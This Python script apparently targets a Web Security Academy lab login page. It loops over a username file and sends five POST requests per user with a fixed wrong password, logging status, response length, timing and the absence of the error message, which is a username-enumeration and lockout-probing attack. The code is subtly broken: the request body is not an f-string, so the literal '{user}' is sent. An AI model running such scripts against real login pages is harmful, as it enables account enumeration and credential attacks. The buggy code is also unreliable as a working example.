import requests

url = "https://ac1e1f1e1f9b722d80174a6a00130021.web-security-academy.net/login"
# cookies = {'session': '123456'}
# headers = {"content-type":"application/json"}

with open("../usernames.txt") as file:
    users = [user for user in file]

for i, user in enumerate(users):
    user = user.strip()
    print(i, user)
    for _ in range(5):
        response = requests.post(url, data="username={user}&password=totallywrongpassword", allow_redirects=False)
        print("- {} {} {} {}".format(response.status_code, len(response.text), response.elapsed.total_seconds(), "Invalid username or password" not in response.text))
        # if "Invalid username or password" not in response.text:
        #     print("found this guy:", user)
